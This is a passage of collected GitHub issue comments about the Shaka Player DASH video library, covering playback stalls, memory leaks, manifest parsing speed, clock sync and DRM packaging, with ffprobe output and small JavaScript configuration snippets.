    "jonobr1": "I'm not sure if this is related, but I think it is. v1.6.3 of Shaka Player throws DOM Exception 18 when uploading video as a texture2d to WebGL.\nI looked at the REDESIGN.md and it says sometime in January 2016 v2.0.+ will be released. Is there any update on this?\n. oh awesome, very handy. Thanks @joeyparrish!\nI know Shaka doesn't use WebGL, but I noticed that when I updated to v1.6.3 I started getting these errors in Safari. I still need to do some research, but it's related in the sense that Shaka Player and Safari are involved. Sorry for the noise!\n. Certainly! I'm making viewable examples, so that should be much clearer than bits and pieces. I'll share them once I've finished.\n. \nhttps://dl.dropboxusercontent.com/u/1595444/shaka-player/stream-texture.html\nNow that I've done some more testing it seems like my previous version of the Shaka Player also has the DOM Exception 18 error. So, I think you're right \u2014\u00a0it has to do more with WebGL than with Shaka. I'm gonna post this over on the Three.js issues.\nBut it is odd that this was working a couple of days ago...\n. ",
    "kareldurdis": "He starts from the first, gets it and keeps trying to get the second.\n. I was running 1.4.1 and with 5s buffer it doesn't try to load the second chunk, but it doesn't start to play either. I've just tried build from master (https://github.com/google/shaka-player/commit/4d9177240ad1fcdebbc4ef4fca8022d9566d32e2) - the video shows it's 20 seconds long, plays the 10 seconds, stops at 10s and tries to get the second chunk.\nI'll get MPD for testing on Monday.\n. @tdrews I've sent you the MPD by email.\n. Thanks for clarification. I did some deep digging into our tracks again:\nVideo track\n```\nffprobe -show_format -show_streams video_h264_720p_3000k.mp4\nffprobe version 2.7.1 Copyright (c) 2007-2015 the FFmpeg developers\n  built with gcc 4.9.2 (Debian 4.9.2-10)\n  libavutil      54. 27.100 / 54. 27.100\n  libavcodec     56. 41.100 / 56. 41.100\n  libavformat    56. 36.100 / 56. 36.100\n  libavdevice    56.  4.100 / 56.  4.100\n  libavfilter     5. 16.101 /  5. 16.101\n  libswscale      3.  1.101 /  3.  1.101\n  libswresample   1.  2.100 /  1.  2.100\n  libpostproc    53.  3.100 / 53.  3.100\nInput #0, mov,mp4,m4a,3gp,3g2,mj2, from 'video_h264_720p_3000k.mp4':\n  Metadata:\n    major_brand     : isom\n    minor_version   : 512\n    compatible_brands: isomiso2avc1mp41\n    encoder         : Lavf56.36.100\n  Duration: 00:00:10.00, start: 0.000000, bitrate: 2020 kb/s\n    Stream #0:0(eng): Video: h264 (Main) (avc1 / 0x31637661), yuv420p, 1280x720 [SAR 1:1 DAR 16:9], 2019 kb/s, 25 fps, 25 tbr, 12800 tbn, 50 tbc (default)\n    Metadata:\n      handler_name    : VideoHandler\n[STREAM]\nindex=0\ncodec_name=h264\ncodec_long_name=H.264 / AVC / MPEG-4 AVC / MPEG-4 part 10\nprofile=Main\ncodec_type=video\ncodec_time_base=1/50\ncodec_tag_string=avc1\ncodec_tag=0x31637661\nwidth=1280\nheight=720\ncoded_width=1280\ncoded_height=720\nhas_b_frames=0\nsample_aspect_ratio=1:1\ndisplay_aspect_ratio=16:9\npix_fmt=yuv420p\nlevel=31\ncolor_range=N/A\ncolor_space=unknown\ncolor_transfer=unknown\ncolor_primaries=unknown\nchroma_location=left\ntimecode=N/A\nrefs=3\nis_avc=1\nnal_length_size=4\nid=N/A\nr_frame_rate=25/1\navg_frame_rate=25/1\ntime_base=1/12800\nstart_pts=0\nstart_time=0.000000\nduration_ts=128000\nduration=10.000000\nbit_rate=2019267\nmax_bit_rate=N/A\nbits_per_raw_sample=8\nnb_frames=250\nnb_read_frames=N/A\nnb_read_packets=N/A\nDISPOSITION:default=1\nDISPOSITION:dub=0\nDISPOSITION:original=0\nDISPOSITION:comment=0\nDISPOSITION:lyrics=0\nDISPOSITION:karaoke=0\nDISPOSITION:forced=0\nDISPOSITION:hearing_impaired=0\nDISPOSITION:visual_impaired=0\nDISPOSITION:clean_effects=0\nDISPOSITION:attached_pic=0\nTAG:language=eng\nTAG:handler_name=VideoHandler\n[/STREAM]\n[FORMAT]\nfilename=video_h264_720p_3000k.mp4\nnb_streams=1\nnb_programs=0\nformat_name=mov,mp4,m4a,3gp,3g2,mj2\nformat_long_name=QuickTime / MOV\nstart_time=0.000000\nduration=10.000000\nsize=2525969\nbit_rate=2020775\nprobe_score=100\nTAG:major_brand=isom\nTAG:minor_version=512\nTAG:compatible_brands=isomiso2avc1mp41\nTAG:encoder=Lavf56.36.100\n[/FORMAT]\n```\nAudio track\n```\nffprobe -show_format -show_streams audio_aac_128k.mp4\nffprobe version 2.7.1 Copyright (c) 2007-2015 the FFmpeg developers\n  built with gcc 4.9.2 (Debian 4.9.2-10)\n  libavutil      54. 27.100 / 54. 27.100\n  libavcodec     56. 41.100 / 56. 41.100\n  libavformat    56. 36.100 / 56. 36.100\n  libavdevice    56.  4.100 / 56.  4.100\n  libavfilter     5. 16.101 /  5. 16.101\n  libswscale      3.  1.101 /  3.  1.101\n  libswresample   1.  2.100 /  1.  2.100\n  libpostproc    53.  3.100 / 53.  3.100\nInput #0, mov,mp4,m4a,3gp,3g2,mj2, from 'audio_aac_128k.mp4':\n  Metadata:\n    major_brand     : isom\n    minor_version   : 512\n    compatible_brands: isomiso2mp41\n    encoder         : Lavf56.36.100\n  Duration: 00:00:10.15, start: 0.046440, bitrate: 133 kb/s\n    Stream #0:0(und): Audio: aac (LC) (mp4a / 0x6134706D), 44100 Hz, stereo, fltp, 131 kb/s (default)\n    Metadata:\n      handler_name    : SoundHandler\n[STREAM]\nindex=0\ncodec_name=aac\ncodec_long_name=AAC (Advanced Audio Coding)\nprofile=LC\ncodec_type=audio\ncodec_time_base=1/44100\ncodec_tag_string=mp4a\ncodec_tag=0x6134706d\nsample_fmt=fltp\nsample_rate=44100\nchannels=2\nchannel_layout=stereo\nbits_per_sample=0\nid=N/A\nr_frame_rate=0/0\navg_frame_rate=0/0\ntime_base=1/44100\nstart_pts=-2048\nstart_time=-0.046440\nduration_ts=447488\nduration=10.147120\nbit_rate=131337\nmax_bit_rate=N/A\nbits_per_raw_sample=N/A\nnb_frames=437\nnb_read_frames=N/A\nnb_read_packets=N/A\nDISPOSITION:default=1\nDISPOSITION:dub=0\nDISPOSITION:original=0\nDISPOSITION:comment=0\nDISPOSITION:lyrics=0\nDISPOSITION:karaoke=0\nDISPOSITION:forced=0\nDISPOSITION:hearing_impaired=0\nDISPOSITION:visual_impaired=0\nDISPOSITION:clean_effects=0\nDISPOSITION:attached_pic=0\nTAG:language=und\nTAG:handler_name=SoundHandler\n[/STREAM]\n[FORMAT]\nfilename=audio_aac_128k.mp4\nnb_streams=1\nnb_programs=0\nformat_name=mov,mp4,m4a,3gp,3g2,mj2\nformat_long_name=QuickTime / MOV\nstart_time=-0.046440\nduration=10.148000\nsize=169077\nbit_rate=133288\nprobe_score=100\nTAG:major_brand=isom\nTAG:minor_version=512\nTAG:compatible_brands=isomiso2mp41\nTAG:encoder=Lavf56.36.100\n[/FORMAT]\n```\nThe video is exactly 10.000 seconds long. The audio is 10.148 long, because the AAC is padding to the closest block size. So the stream is correctly longer than 10 seconds. I guess that pretty much every video track that is aligned with segment length will have an additional audio segment.\nThat solves our mystery. Thanks a lot for assistance.\n. ",
    "peyoh": "Hello, \nnow with the console I'm able to see the error. Is possible the player to recover from this error? Or how the player can continue to play even with some \"sqeezes\"?\nPlease check the console log attached:\nhttps://drive.google.com/file/d/0Bx_EoTGLxRt3QjRSWGp6ejBvdVk/view?usp=sharing\nBTW,\nI'm using edash_packager.\nBRS/\nPeyo\n. Yes. There are some gaps in the input stream. \nUnfortunately this is frequent situation when processing DVB-S stream. For example bad weather, clouds, rain. Some picture/audio breaks are not problem, but the player is unable to recover from the error  and the user is forced to stop and start playing the channel again which can cause bad user experience. \nIf I can tell to the player to jump on the next segment (probably good), this will smash the picture(of course), but will no stop the service.\nBRS/\nPeyo\n. Hello, \nI've tried your suggestion, but without success. \nUnfortunately I'm not javascript developer, so I will leave the future investigations on more skilled developers. \nBRS/\nPeyo\n. Hello,\nactually this is not so rare issue . This issue can be replicated with a very small gaps and only in Audio even the video is untouched. \nThis situation I've replicated  in my lab. The video/audio transcoder just put a small gap (for example 283 bytes) in audio, when the input audio stream cannot be decoded ( missing header, PES mismatch etc.) . The video is not affected. But even then the issue is \nvisible and the player stops.\nBRS\n. @joeyparrish, I don't know your private email. Where I can find it? \nOnce I have it, I will send you a link. From this link you can also reproduce https://github.com/google/shaka-player/issues/288\n. @joeyparrish, I've just send you a email with URLs\n. Hello,\nI've noticed, that every time the player stops playing, this message appears in the debug console:\nSBM audio/mp4: multiple buffered ranges detected: Either the content has gaps in it, the content's segments are not aligned across bitrates, or the browser has evicted the middle of the buffer. source_buffer_manager.js\nHow I can catch this event from the player? Because if I can catch it, I can try to move 1 sec forward.\nBRS\n. Thank you!\n. Update,\nv.1.6.2 doesn't have this issue.\n. Sorry for this \"term\" :),\nVideo stops and starts again after 3-7 seconds, next read the manifest. Video stops again and starts after 3-5 sec. Read manifest again and video stops again....etc. Will send you a complete debug log. Seems like parsing the manifest overloads the browser.\n. @joeyparrish.\nI just paste here the text from my email because this can be helpful for somebody:\nWith larger timeshifts it seems .MPD parsing speed is greatly affected by SegmentTemplate startNumber=\"17650\" parameter:\n```\n  <Representation id=\"2\" bandwidth=\"1701840\" codecs=\"avc1.4d001e\" mimeType=\"video/mp4\" sar=\"64:45\" width=\"640\" height=\"512\">\n    <SegmentTemplate timescale=\"90000\" initialization=\"edash-video-512.mp4\" media=\"edash-video-512-$Number$.mp4\" startNumber=\"17650\">\n      <SegmentTimeline>\n        <S t=\"16786616400\" d=\"950400\" r=\"8173\"/>\n      </SegmentTimeline>\n    </SegmentTemplate>\n  </Representation>\n\n```\nAs the time goes on, this number increments and the interface starts to be insensitive\nand with great delays on events. The CPU load increments also, and on some mobile devices mpd update takes too much time and the playbuffer starts starving.\nThis I can reproduce on 1.6.2.\nBut with 1.6.3 even with small timeshift, I'm unable to play video. Seems like manifest ubdate REALLY gets too much time. \n. @joeyparrish With timeshiftbufferdepth of 3600 sec, both versions works well. \nJust to mention something I think is important. \nOn the Chrome debug console The time interval between \"Updating manifest\" and \"Manifest updated\" is  quite different between 1.6.2 and 1.6.3. \nOn 1.6.2 the inteval is around half a second, but on 1.6.3 is more than a second and increments with larger timeshift interval.\nUpdating manifest...\nlive_segment_index.js:240 @availabilityStartTime seems to be inaccurate; some segments may not be available yet: currentPresentationTime 145876.00200009346 latestAvailableSegmentEndTime 145880.25333333333\nlive_segment_index.js:240 @availabilityStartTime seems to be inaccurate; some segments may not be available yet: currentPresentationTime 145876.00200009346 latestAvailableSegmentEndTime 145882.88\nlive_segment_index.js:240 @availabilityStartTime seems to be inaccurate; some segments may not be available yet: currentPresentationTime 145876.00200009346 latestAvailableSegmentEndTime 145884.8\nlive_segment_index.js:240 @availabilityStartTime seems to be inaccurate; some segments may not be available yet: currentPresentationTime 145876.00200009346 latestAvailableSegmentEndTime 145883.84\nlive_segment_index.js:240 @availabilityStartTime seems to be inaccurate; some segments may not be available yet: currentPresentationTime 145876.00200009346 latestAvailableSegmentEndTime 145881.96266666666\nplayer.js:191 + audio/mp4; codecs=\"mp4a.40.2\" is supported\nplayer.js:191 + video/mp4; codecs=\"avc1.4d001e\" is supported\n2player.js:191 + video/mp4; codecs=\"avc1.4d0015\" is supported\nplayer.js:191 + video/mp4; codecs=\"avc1.4d001e\" is supported\nmanifest_updater.js:397 Updated SegmentIndex 0: 182 -> 182 SegmentReference(s).\nmanifest_updater.js:397 Updated SegmentIndex 1: 8227 -> 8228 SegmentReference(s).\nmanifest_updater.js:397 Updated SegmentIndex 2: 8227 -> 8228 SegmentReference(s).\nmanifest_updater.js:397 Updated SegmentIndex 3: 8227 -> 8228 SegmentReference(s).\nmanifest_updater.js:397 Updated SegmentIndex 4: 171 -> 172 SegmentReference(s).\nplayer.js:191 + audio/mp4; codecs=\"mp4a.40.2\" is supported\n2player.js:191 + video/mp4; codecs=\"avc1.4d0015\" is supported\n2player.js:191 + video/mp4; codecs=\"avc1.4d001e\" is supported\nstream_video_source.js:476\n Manifest updated!\nThank you.\nBRS/\nPeyo\n. Hello,\nyes it is fixed. Thank you!\nBRS\n. @neilRGS, \nwhatrelease number  you are using ? 1.6.2 or 1.6.3 ?\n. Please revert to 1.6.2 and try again. \n. @neilRGS Thank you for your time. \nI've also tried on IE11 with live profile and the result is the same as yours. I provide also support page output. Hope this can help.\n`Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko { manifest: {\n basic: true \napplication/dash+xml: false \napplication/x-mpegurl: false \napplication/vnd.apple.mpegurl: false \napplication/vnd.ms-sstr+xml: false \nmpd: false \nm3u8: false\n ism: false } \nmedia: { basic: true video/mp4; codecs=\"avc1.42E01E\": true \nvideo/mp4: true \naudio/mp4; codecs=\"mp4a.40.2\": true \naudio/mp4: true video/webm; codecs=\"vp8\": false \nvideo/webm: false \nvideo/webm; codecs=\"vp9\": false \naudio/webm; codecs=\"vorbis\": false \naudio/webm: false\n audio/webm; codecs=\"opus\": false\n video/mp2t; codecs=\"avc1.42E01E\": true \nvideo/mp2t: true \nvideo/mp2t; codecs=\"mp4a.40.2\": true \ntext/vtt: true \napplication/mp4; codecs=\"wvtt\": false \napplication/mp4: false \napplication/ttml+xml: false \napplication/mp4; codecs=\"stpp\": false } \ndrm: { basic: true \norg.w3.clearkey: false \ncom.widevine.alpha: false \ncom.microsoft.playready: false\n com.apple.fps.2_0: false \ncom.apple.fps.1_0: false \ncom.apple.fps: false\n com.adobe.primetime: false\n } supported: true\n } `\nBRS,\nPeyo\n. Hi Joe,\nunfortunately not. \nI will prepare a test environment. You may help me to understand if this is Chrome, packager or player issue. \nBRS\nPeyo\n. Yes. Car I'm able to play on Android. \n. Aha. The system has many components so it is complicated. I will prepare the test environment and I will appreciate any help from you. \n. Hi Joe, \nthe networking issues was fixed. Credentials are in your mailbox.\n. Hello,\ndid you see something? Are you able to reproduce this issue? \nBRS\n. Hi Joe, \nwe also observed this in v.2 \nSeems like this one:\nhttps://github.com/google/shaka-player/issues/288\n. Thanks, \nnow is better.\n. ",
    "molszanski": "I know. Docker could liberate people who want to run the compiler/build but have an incompatible java stack. \n. ",
    "carcharodoncarcharias511": "Ah thanks. The 'ended' is working for me on the video element. \n. ",
    "torerikal": "The Shaka project test manifests are rather short, while real-world usage patterns of the player very often means continuous playing times above a hour or more.\nAnyway, the Sintel example is long enough to indicate the memory leak(?). We have run tests and compared with Dash.js. The memory usage is sampled from Chrome's task manager:\n\nI hope you can prioritize looking into it, as it is a real problem affecting real usage patterns for the player: For instance, end users watching movies or sports events, lasting 1 to 2 hours, or even more, do report the Chrome tab to crash.\n. I run the Google DevTools profiler again, and for the largest memory size spent, it points to a lot of ArrayBuffer instances, as earlier mentioned. A closer look reveals that these are being members of FailoverUri instances' fulfilled request promises. In clear text, that means the XHR responses from segment fetching. \nAll the FailoverUri instances are stored in SourceBufferManager's member array this.inserted_, through their SegmentReference memberships, and this looks like the source of accumulation.\nIt's a bit early to draw conclusions, but I made a change to FailoverUri where the this.requestPromise_ reference was set to null as soon as the request was fulfilled (which might mean some segments must be reloaded). \nThis seems to have a significantly good effect on the memory usage, and the ArrayBuffer instances disappear from the profiler results. \nWhen completing playback of the 1080P Sintel example from start to end, a few tests show that the tab has spent around 450 MB of memory after this change, as opposed to almost 1 GB earlier.\nHowever, the memory consumption still increases proportionally with playback time, so there might be more sources for memory leaks. \nMore testing will be done.\n. Great. Here is an updated chart with my observations after applying the change. As you see, there is still an accumulation of used memory during the near 15 minutes long Sintel playback, but less than half the magnitude. We will do some more tests tomorrow with longer playback (1-2 hours) to see how this graph develops.\n\n. Testing two hours playback now shows just a small increase in memory usage after it being stabilized the first minutes. This is satisfactory to us. Thanks.\n\n. Thanks a lot for your investigations and fixes.\nUnfortunately, I still get similar errors both in Edge and IE11 (see screenshot), but less frequently than earlier. I have earlier mentioned the error message \"Cannot fetch (audio/mp4): previous operation not complete\". Now I only observe \"Cannot clear (video/mp4): previous operation not complete\". I don't know if this distinction is of interest.\nWith the fixes, I haven't been able to stall the playback in your test manifest or our custom streams, which do look like an improvement.\n\n. Thank you for your effort in troubleshooting and pinpointing several problems. I am sorry to say that I still am able to reproduce the error, as described in my previous comment, fairly frequently in IE11, with your test link. I am not able to reproduce the problem in Edge anymore. \nEdge is most important to us, so from our side, the most important part is solved.\nIf you want to look into it once more with regards to IE11, here are some more details: \nIn around twenty attempts, the problem is encountered seven times. Sometimes early after starting playback, on the third seek attempt, and sometimes after numerous seeking operations. In most cases, the playback stalls mid-seek when the errors show up in the console.\nThe problem appears both in IE11 on Windows 8.1 and Windows 10. My installations were running virtually, though.\nI have tried to see if there is a special pattern in my \"random\" seeking that makes the error occur. Especially with regards to entering previously played ranges or ranges I assume not being buffered. Unfortunately, when repeating a pattern that once triggered the error, the error didn't show up on the second attempt, so it all looks fairly random.\nA note about Edge: The \"undefined\" assertion log entries are still there, and they tend to show up more frequently after a while with playback and seeking. \n. Another case which seems to be the same issue as above, is integers too big to be handled by Javascript's number type.\nWe have a live stream setup where the segment timeline starts with e.g. t=\"14641133787680667\". The number returned from parsing this number is 14641133787680668. This rounding error results in 404 errors when the segment URLs are composed from this offset.\nThe big numbers in the manifest, is a result of a timescale of 10,000,000, combined with offsets similar to Unix timestamps. In other words, the number of seconds from Jan 1 1970, multiplied by 10 millions, is part of the segment URLs. We are told this can't be changed.\nWe need a fairly quick workaround, and are considering rewriting Shaka's timeline number handling by integrating with a big integer library, like https://github.com/peterolson/BigInteger.js.\n@joeyparrish If you don't see a simpler solution, do you see any issues with this strategy? Performance might be one concern.\n. Thanks for sharing the Shaka dev team's stance on this.\nAlso, thank you for your offer to discuss it with the vendors. In the long run, we will definitely check these complicating factors out with the vendors of the stream infrastructure, and then I might get back to you for a common effort to sort it out.\n. Thanks, this fix seems to have a big impact. \nWithout the fix, I have had CPU spikes with 100 % usage for a second or two. This is eliminated when applying the fix.\n. @janouskovec I had to create a fix for our fork of 1.6.5. Please have a look at this commit if that can help you: \nhttps://github.com/vimond/shaka-player/commit/adbcdb5b886738319c3818b1bf7de416b8e4d8cc\nNot very elegant and code-style-compliant, but I hope it could be used as a basis for your own patch.\n. ",
    "TheModMaker": "Now you can to set the streamBufferSize configuration to a large value and the player will use the MPD minBufferSize to determine how much to buffer before playback resumes.\n. We have not started work on this, but a PR would be appreciated.  It would be best implemented as a plugin to TextEngine (see VttTextParser).  The plugin will be given the media segment (as an ArrayBuffer) and it will produce an array of VTTCues.. I don't think this is closed since we don't support CEA 708 on platforms with native TS support (e.g. Edge and Chromecast).  At the very least we should add an option to force transmuxing so we can parse these captions.  Alternatively we might be able to have mux.js just parse the captions and not actually transmux anything.. Chrome 56 is now in stable.  Closing due to inactivity.  Feel free to reopen if the issue persists.. Chrome 56 is now in stable. Closing due to inactivity. Feel free to reopen if the issue persists.. Now the clock will synchronize on manifest updates, so if the clock changes it will be updated on the next manifest update.  Please test again on master.\nAlso, the manifest in your description does not contain a UTCTiming element.  Without it, Shaka will not do clock sync at all. See this example from Dash IF:\nhttp://vm2.dashif.org/livesim/utc_direct-head/testpic_2s/Manifest.mpd\n. In v1, when switching tracks, the default is to clear the buffer.  So when explicitly switching to a new track: it will clear the buffer, enter a buffering state while it downloads the current segment, and then continue once it's downloaded.  In v2, it does not clear the buffer by default (you can still specify whether to do it in the API).\n. This is a limitation of the demo app, which will always clear the buffer.  However, if you use the API, you can specify whether to clear the buffer.\nv1: http://v1-6-5.shaka-player-demo.appspot.com/docs/shaka.player.Player.html#selectAudioTrack\nhttp://v1-6-5.shaka-player-demo.appspot.com/docs/shaka.player.Player.html#selectVideoTrack\nv2: http://shaka-player-demo.appspot.com/docs/api/shaka.Player.html#selectTrack\n. This is a limitation of the demo app, which will always clear the buffer.  However, if you use the API, you can specify whether to clear the buffer.\nv1: http://v1-6-5.shaka-player-demo.appspot.com/docs/shaka.player.Player.html#selectAudioTrack\nhttp://v1-6-5.shaka-player-demo.appspot.com/docs/shaka.player.Player.html#selectVideoTrack\nv2: http://shaka-player-demo.appspot.com/docs/api/shaka.Player.html#selectTrack\n. No, both demo apps do this.\n. No, both demo apps do this.\n. Recently we have made some updates to the network stability (#390).  Can you try again from master to see if they fixed your problems?  They helped in my testing.\n. Recently we have made some updates to the network stability (#390).  Can you try again from master to see if they fixed your problems?  They helped in my testing.\n. I disagree about EME probing.  I think this is a very real use-case to be able to determine key-system support early.  In the demo app, we disable assets that the browser does not support.  If we stopped EME probes, we would be unable to do this.\nAn app would need to wait until it tries to play a manifest before it could determine if the browser supported the key-system.  Plus, it would need to listen to Player error events and have special code to check for the error code and do something different.  As opposed to currently, where it can detect it before it even creates a Player.\nI agree we should split up support() into a synchronous version and an async version.  But, I think we should keep EME probes (for production).  Maybe we should modify the way we do it.  Instead of probing all key systems with empty configs, what about accepting an array of DrmInfo and using that to construct the EME query.  This will mirror the query we will do later and allow apps to detect the exact support they want.  Plus, the support method will only probe the key-systems that the app needs.\n. I just added a change to optimize the parser which increased performance in our tests.  Can you try again from master and see if this fixes it?\n. If you select a track using player.selectTrack, it will disable abr because you selected a specific track.  If you want to change languages, you can use player.configure.  This will cause it to switch tracks without disabling abr.\njs\nplayer.configure({preferredAudioLanguage: 'es'})\nIn the demo app, selecting a track from the drop-down list will use player.selectTrack.  You can change the preferred language text box and press Enter and it will change to another language.\n. What version are you using and on what platform?  Have you tried with a clean version on master? This is a duplicate of #323 and should have been fixed in 58ac690.\n. I have verified that this happens on Windows, will investigate further.\n. A while ago, I filed Dash-Industry-Forum/DASH-IF-IOP#124 for clarification.  The DASH-IF have updated their site to be more clear.  However, we still don't have access to the ISO/IEC 23003-3 spec required.. Does your manifest have a suggestedPresentationDelay?  This will delay the seek range from the live edge and the Player will still download segments past it.  So if you set suggestedPresentationDelay to 5 seconds, seeking to the end of the seek range will still have 5 seconds of buffer ahead of it.\n. Now we will fire JavaScript events for the EventStream elements.  The design is similar to @baconz design, but the event names are a little different.  The three events are timelineregionadded, timelineregionenter, and timelineregionexit.\nWe also do not parse the Event node.  So if you want to get the scte35 info (or anything that is in the Event), you have to parse it in the app.. Now you can pass --debug to the ./build/build.py script to not rename anything and expose all private members.  This should allow you to import it the same as the non-debug version but still have the normal names.\nWe will also be adding the debug version of the compiled library to future versions on npm.  So you can include shaka-player.compiled.js for your production code and shaka-player.compiled.debug.js for debugging.  So once we release v2.1.0 you will be able to just pull the debug version from npm.. @mseeley does this work for you? Can I close this?. There are two problems here:\nFirst, we do not account for suggestedPresentationDelay when determining where to start playing.  So we want to play too close to the live edge and have to buffer until the segments become available.  This has just been fixed on master.\nSecond, your manifest does not have a suggestedPresentationDelay.  This means we use a default value of 5 seconds, which is too small for your setup.  You should add a suggestedPresentationDelay attribute to your MPD element with about 20 seconds.\n. The tracks (player.getTracks) change immediately.  The new tracks will be used to download new segments, but the old segments will still be in the buffer.  The second argument to player.selectTrack is whether to clear the buffer.  Passing true will clear the buffer so the resolution change is immediate, but the player will enter a buffering state until the new segments are downloaded.\nWe do not download segments that have already been downloaded.  So if we have buffered seconds 10-20 and the tracks change, we will download seconds 20-30 in the new resolution.  We could alter the second argument to give a length of time to keep buffered (i.e. passing 10 will keep 10 seconds of the old resolution).\nAs for an event, the track change happens immediately.  Are you talking about when the video display resolution changes?  We do not control that.  All we do is append the media data into the video element.  The video element will display whatever is at the current position.  When you call player.selectTrack, the video resolution will change because the new segments being appended have a new resolution.\n. If adjusting the native clock fixed it, this is probably a problem with clock sync.  Your browser and server have to have the same time in order to play live streams correctly.  You can either Include a UTCTiming element in the manifest or set the .manifest.dash.clockSyncUri configuration value to your server.\nSee this comment for more info.\n. First, persistent licenses are supported in Chrome, but only on ChromeOS.  There is work being done to add this to Android as well (see crbug/493521).  But what you want is already possible when using Storage:\njs\nstorage.configure({usePersistentLicense: false});\nSee: https://shaka-player-demo.appspot.com/docs/api/shakaExtern.html#OfflineConfiguration. @dobrusev That seems unlikely.  If the player is requesting a bad segment number, that seems like a bug.  Please file a new issue, preferably with a link to the manifest.. We just pushed a design doc for our implementation of gap jumping.  I have also started working on it and hope to have something in within the next week or two.\nThe basic idea is for encoders to introduce gaps in the manifest (e.g. missing segments, or Periods with both a start and duration).  Then we will jump any of the resulting gaps.  If the gap is larger than a configurable threshold, we will raise an event.. We just pushed the main implementation of gap jumping.  Now any gaps that appear in the media or the manifest will be jumped automatically.  You can see it live on the nightly page.\n\"Small\" gaps are jumped automatically.  These are gaps smaller than config.streaming.smallGapLimit, default of 0.5 seconds.  This can be increased using player.configure().  \"Large\" gaps result in an event on Player (type largegap).  These can also be jumped automatically by setting config.streaming.jumpLargeGaps to true.. @sanbornhilland Is this still something you need? Do you know the duration ahead of time?  How should people see it if they join after 10am (if they can)?. Closing due to inactivity.. Here are the first few frame times of the audio stream, according to Chrome:\n|DTS|PTS|\n|-----|--------------|\n|0 | -0.46439|\n| 0.23219 | -0.23219 |\n| 0.46439 | 0 |\n| 0.69659 | 0.23219 |\n| 0.92879 | 0.46439 |\nThe first few audio frames in the presentation have a PTS < 0, this causes Chrome's MSE to drop the early frames.  Then Chrome's DTS vs PTS problem (see #377) will see the first frame at 0.46439 seconds, which is a gap that the video element will not jump.  Additionally, the audio frames have a DTS > PTS, which Chrome is unsure if that is valid (see Chrome bug 354518).\nSo either this is Chrome's bug or the content is bad.  I would suggest contacting the encoder that made the content to make sure that DTS <= PTS.  If you could have PTS == DTS == 0 for the first frame, that would fix it.. I just pushed a change that should fix the problem.  Please try again with the latest from master.. @hghazzi First I am getting a 403 error for the manifest.  Please post an accessible manifest.\nAlso please open a new issue.. I can reproduce on Firefox on Mac.  The problem here is that Firefox is doing a full cache of the time request.  Meaning it is not even sending the HEAD request, it is using the old response which gives us a bad clock offset.  The time sync server used for this asset does not have cache control headers (see Dash-Industry-Forum/Test-Vectors/53).\nUnfortunately since this is cache related, there is nothing Shaka Player can do about it.  The only way to force the browser to not use a cache is by changing the URL, which we shouldn't do (since we don't know what query parameters a server might be using).. I can reproduce on Firefox on Mac.  The problem here is that Firefox is doing a full cache of the time request.  Meaning it is not even sending the HEAD request, it is using the old response which gives us a bad clock offset.  The time sync server used for this asset does not have cache control headers (see Dash-Industry-Forum/Test-Vectors/53).\nUnfortunately since this is cache related, there is nothing Shaka Player can do about it.  The only way to force the browser to not use a cache is by changing the URL, which we shouldn't do (since we don't know what query parameters a server might be using).. @alam-bline (note this only applies to live content) You need to make sure that you have correct clock sync setup.  The manifest should use UTCTiming elements.  The time server should serve content with the correct cache control headers to disable caching of the responses.  Instead of UTCTiming elements in the manifest, you can also pass a time server in the player configuration:\njs\nplayer.configure({manifest: {dash: {clockSyncUri: '//example.com/time.txt'}}});. @alam-bline (note this only applies to live content) You need to make sure that you have correct clock sync setup.  The manifest should use UTCTiming elements.  The time server should serve content with the correct cache control headers to disable caching of the responses.  Instead of UTCTiming elements in the manifest, you can also pass a time server in the player configuration:\njs\nplayer.configure({manifest: {dash: {clockSyncUri: '//example.com/time.txt'}}});. @cpeterso When we load the stream, we use XMLHttpRequest to make a HEAD request.  The response has a header that we use to determine the clock sync.  This response is cached in Firefox and is causing problems (because the cached header contains an old time).. @cpeterso When we load the stream, we use XMLHttpRequest to make a HEAD request.  The response has a header that we use to determine the clock sync.  This response is cached in Firefox and is causing problems (because the cached header contains an old time).. Thanks for the contribution, but we decided to fix this slightly differently.. JavaScript has an odd definition of variable scopes, it uses something called hoisting.  The variable is actually \"defined\" at the beginning of the function.  So at the end of the method it still has the last value stored (from the last Period).  This error only appears when there are no periods and the variable is still set to undefined.. Shaka Player doesn't do anything with style or UI.  This library only handles the loading and playing of the video segments.  We created a demo page that is used to show off our player, but is not itself required to use Shaka Player.  You can follow the tutorials to start from scratch with your own UI elements.\nYou are welcome to use your own HTML and CSS code to make your player look however you like with Shaka Player only handing the playing of the videos.  The only thing that Shaka Player does is interact with the <video> element by telling it what video content to play.. The new design is for networking scheme plugins to return a RECOVERABLE severity when it should retry and CRITICAL severity when it shouldn't.  So you can either write your own HTTP plugin or modify the existing one to do this.\nAnother option would be to write a shim between the HttpPlugin and the NetworkingEngine.  You would do this by registering your own http(s) plugin that forwards to the HttpPlugin for the request and filters errors.  When you get a BAD_HTTP_STATUS error, you can look at error.data[1] for the status and change the error severity to CRITICAL.\nFor example:\n```js\nfunction MyHttpPlugin(uri, request, requestType) {\n  return shaka.net.HttpPlugin(uri, request, requestType).catch(function(error) {\n    if (error.code == shaka.util.Error.Code.BAD_HTTP_STATUS &&\n        (error.data[1] == 401 || error.data[1] == 403)) {\n      // NetworkingEngine should not retry the request.\n      error.severity = shaka.util.Error.Severity.CRITICAL;\n    }\n    throw error;\n  });\n}\nshaka.net.NetworkingEngine.registerScheme('http', MyHttpPlugin);\nshaka.net.NetworkingEngine.registerScheme('https', MyHttpPlugin);\n```. @londonshliach So now we will not retry for 401/403.\nIf you want a more general filtering logic, you can still do what I described above.. @hghazzi does clockSyncUri fix the issue for you?  Can we close this?. Closing due to inactivity.. For the Shaka Player test content, we use another Google project, Shaka Packager (https://github.com/google/shaka-packager).  This is able to handle both segmenting media and encrypting the segments.. For testing content, you can use the widevine_test keys.  However, these are public so don't offer much protection.  If you want to privately protect content, you will need to contact Widevine directly: http://www.widevine.com/contact.html.\nTo encrypt content using the test keys, use the following flags, as described in the packager README section Driver Program Sample Usage:\n--enable_widevine_encryption \\\n--key_server_url \"https://license.uat.widevine.com/cenc/getcontentkey/widevine_test\" \\\n--content_id \"3031323334353637\" \\\n--signer \"widevine_test\" \\\n--aes_signing_key \"1ae8ccd0e7985cc0b6203a55855a1034afc252980e970ca90e5202689f947ab9\" \\\n--aes_signing_iv \"d58ce954203b7c9a9a9d467f59839249\"\nIf you pass --mpd_output [filename] it will generate the MPD for you.  That will be playable directly so long as you give the Player the 